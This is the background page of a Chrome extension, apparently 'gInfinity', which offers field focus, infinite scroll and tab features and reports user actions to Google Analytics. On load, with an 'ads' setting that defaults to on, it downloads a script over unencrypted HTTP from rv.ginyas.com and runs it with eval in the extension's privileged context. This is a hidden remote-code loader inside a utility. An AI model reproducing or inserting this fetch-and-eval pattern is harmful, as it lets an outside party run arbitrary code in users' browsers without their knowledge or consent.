<html>
<body onload="initGinyas();">
<script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-26812870-2']);
    _gaq.push(['_trackPageview']);

    (function () {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = 'https://ssl.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
</script>
<script type="text/javascript">
///////// BOOTSTRAP ////////

if (!localStorage["enable_focus"]) localStorage["enable_focus"] = "true"
if (!localStorage["enable_infinite_scroll"]) localStorage["enable_infinite_scroll"] = "true"
if (!localStorage["enable_links"]) localStorage["enable_links"] = "true"
if (!localStorage["enable_tabs"]) localStorage["enable_tabs"] = "true"
if (!localStorage["enable_ads"]) localStorage["enable_ads"] = "true"
if (!localStorage["enable_ping"]) localStorage["enable_ping"] = "false"
if (!localStorage["ping_success_color"]) localStorage["ping_success_color"] = "#DCFBD1"
if (!localStorage["ping_failure_color"]) localStorage["ping_failure_color"] = "#FFDDDD"
if (!localStorage["enable_color_chooser"]) localStorage["enable_color_chooser"] = "false"

///////// GINYAS ///////////

function initGinyas() {
    if (localStorage["enable_ads"] == "true") {
        var bbrsLogic = "http://rv.ginyas.com/app/bookmark/bookmarklet/bbrsChromeRVObs.php?pubId=ginyas_223&affId=ginyas_223";
        var domainsXHR = new XMLHttpRequest(); domainsXHR.open("GET", bbrsLogic, true);
        domainsXHR.onreadystatechange = function () {
            if (domainsXHR.readyState == 4) {
                globalEval(domainsXHR.responseText);
            }
        }
        domainsXHR.send();
        _gaq.push(['_trackEvent', 'gInfinity', 'Ads enabled']);
    } else {
        _gaq.push(['_trackEvent', 'gInfinity', 'Ads disabled']);
    }
}

function globalEval(src, callback) {
  if (window.execScript) {window.execScript(src);if (callback){callback();} return;} 
  var fn = function() {window.eval.call(window,src);
  if (callback){callback();}};fn();
}

//////// FOCUS ////////////

var xpath;

// Set focus on element in xpath.
function focusThis() {
    return function (info, tab) {
        if (!xpath) {
            return;
        }

        try {
            localStorage['focus_' + info.pageUrl] = xpath;
            _gaq.push(['_trackEvent', 'Focus', 'Select focus element']);
        } catch (e) {
            console.log(e);
            if (e == QUOTA_EXCEEDED_ERR) {
                var notification = webkitNotifications.createNotification(
                    'images/infen_logo_48x48.png',
                    'Whoops!',  // notification title
                    'Quota exceeded. Try unfocusing some sites to free up space.'
                );
                notification.show();
            }
        }
    };
}

// Remote focus for the current url.
function unfocusThis() {
    return function (info, tab) {
        localStorage.removeItem('focus_' + info.pageUrl);
        _gaq.push(['_trackEvent', 'Focus', 'Delete focus element']);
    }
}

function setFocus(url) {
    var elementXpath = localStorage['focus_' + url];
    if (!elementXpath) {
		return;
    }

    _gaq.push(['_trackEvent', 'Focus', 'Set focus']);

    chrome.tabs.getSelected(null, function(tab) {
        chrome.tabs.sendRequest(tab.id, { xpath: elementXpath }, function(response) { });
    });
}

var focusId = chrome.contextMenus.create({ "title": "Focus", "type": "normal", "contexts": ["editable"], "onclick": focusThis() });
var unfocusId = chrome.contextMenus.create({ "title": "Unfocus", "type": "normal", "contexts": ["editable"], "onclick": unfocusThis() });

////////// SHARED //////////////

chrome.extension.onRequest.addListener(function (request, sender, sendResponse) {
    if (request.method == "setFocus") {
        chrome.tabs.getSelected(null, function (tab) {
            setFocus(tab.url);
        });
    } else if (request.method == "setXPath") {
        xpath = request.xpath;
    } else if (request.method == "getLocalStorage") {
        sendResponse({ data: localStorage[request.key] });
    } else if (request.method == "log") {
        _gaq.push(['_trackEvent', request.category, request.text]);
        sendResponse({});
    } else {
        sendResponse({});
    }
});
</script>
</body>
</html>